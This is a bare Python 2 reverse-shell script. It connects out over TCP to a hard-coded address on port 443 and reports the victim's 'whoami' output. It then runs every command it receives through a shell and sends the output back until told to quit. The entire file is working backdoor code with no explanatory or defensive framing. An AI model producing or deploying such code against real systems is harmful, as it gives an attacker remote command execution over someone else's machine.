#-*- coding: cp1254 -*-
import subprocess
import socket

host = "192.168.64.159"
port = 443

contact = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
contact.connect((host, port))

pc_name = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
pcname = pc_name.stdout.read() + pc_name.stderr.read()
contact.send("[+] Target Connected: "+str(pcname)+"\n")

while 1:
	data = contact.recv(1024)
	if data == "q": break
	comm_line = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	output = comm_line.stdout.read() + comm_line.stderr.read()
	contact.send(output)

contact.send("[*] Connection Closed")
contact.close()
